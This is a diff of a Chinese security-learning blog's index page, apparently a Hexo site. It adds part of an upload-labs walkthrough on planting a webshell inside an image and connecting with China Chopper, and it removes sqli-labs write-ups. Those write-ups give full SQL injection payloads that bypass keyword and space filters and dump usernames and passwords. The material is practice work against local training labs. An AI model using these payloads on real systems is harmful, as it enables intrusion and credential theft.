+<p>然后上传上去会被改名字burp可以看见被改后的名字 和储存的路径<img src="https://img.kanzhun.com/images/seo/mianshiti/20191125/160089f90c50a936fb1cb0694380bce5.jpg" alt="在这里插入图片描述"></p>
+<p>然后就是用菜刀连接一下了 </p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/upload-labs/aaa.php?file=upload/4320181108192653.png">http://127.0.0.1/upload-labs/aaa.php?file=upload/4320181108192653.png</a> 就还挺快的除了需要解析这一步</p>
+<p><strong>十四关</strong> 和十三差不多只是检测不一样 十三检测开头两个字节就是图片以记事本打开后的前三行可以只保留前三行然后其余全部删掉换成后门文件 </p>
+<p>十四没法这么干好像 这个是getimagesize检查那就只能用那个cmd的嵌入法 其余和十三一样了</p>
+<p><strong>十五</strong>  和前面差不多换成exif_imagetype的检查函数</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/03/01/page-32/" data-id="ckuzhneyt0013v4w7d5weaukm" data-title="uplolalabs&#39;13 14 15" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-page-30" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2021/02/18/page-30/" class="article-date">
@@ -465,97 +624,6 @@
 
 
   
-    <article id="post-page-20" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/02/05/page-20/" class="article-date">
-  <time class="dt-published" datetime="2021-02-05T09:12:26.000Z" itemprop="datePublished">2021-02-05</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/02/05/page-20/">sqlilabs 26</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>z这关神奇的过滤了空格<img src="https://oscimg.oschina.net/oscnet/d2d67dc82bcdbc5788c50fad9e027f1de97.png" alt="img"></p>
-<p>试一试报错注入 </p>
-<p>?id=1’||updatexml(1,concat(‘:’,(select database())),1)||’1’=’1 </p>
-<p>?id=1’||updatexml(1,concat(‘:’,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=’security’))),0)||’1’=’1 (前头有个问号 然后information or双写 空格的位置用）替代 获取所有表名字 )</p>
-<p>?id=1’||updatexml(1,concat(‘:’,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name=’users’))),0)||’1’=’1 然后获取列名</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/02/05/page-20/" data-id="ckuzhneym000uv4w71sz3g5ap" data-title="sqlilabs 26" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-page-19" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/02/01/page-19/" class="article-date">
-  <time class="dt-published" datetime="2021-02-01T08:13:49.000Z" itemprop="datePublished">2021-02-01</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/02/01/page-19/">sqlilabs 25 25a</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>a 这关过滤了or 和and 如果末尾的闭合要用and‘1’=‘1 就需要吧and双写 anandd </p>
-<p>或者直接用–+也行</p>
-<p>order 的or也会被过滤 那么就写成oorrder </p>
-<p>?id=-1’ oorrder by 3 –+ 测显位</p>
-<p>?id=-1’ union select 1,2,database() –+ 爆数据库</p>
-<p>?id=-1’ union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema=’security’ –+这边information的or也要双写 爆表名</p>
-<p>?id=-1’ union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where table_name=’users’ –+  爆字段</p>
-<p>?id=-1’ union select 1,2,group_concat(username,0x7e,passwoorrd) from users –+ 爆数据</p>
-<p>0x7e 是显示~这个符号用的 也可以不打进去</p>
-<p>25a和25差不多就没有了单引号 </p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/02/01/page-19/" data-id="ckuzhneym000tv4w7g0nx4utf" data-title="sqlilabs 25 25a" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -579,7 +647,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
     </div>
   </div>
 
@@ -592,6 +660,14 @@
       <ul>
         
           <li>
+            <a href="/2022/08/21/page-129/">ISCC复现</a>
+          </li>
+        
+          <li>
+            <a href="/2022/08/21/page-128/">巅峰极客easy_Forensic</a>
+          </li>
+        
+          <li>
             <a href="/2021/10/20/page-127/">web点2</a>
           </li>
         
@@ -601,14 +677,6 @@
         
           <li>
             <a href="/2021/10/20/page-125/">杂项杂项</a>
-          </li>
-        
-          <li>
-            <a href="/2021/09/22/page-121/">GYCTF2020Easyphp</a>
-          </li>
-        
-          <li>
-            <a href="/2021/09/22/page-120/">红明谷CTF 2021write shell</a>
           </li>
         
       </ul>
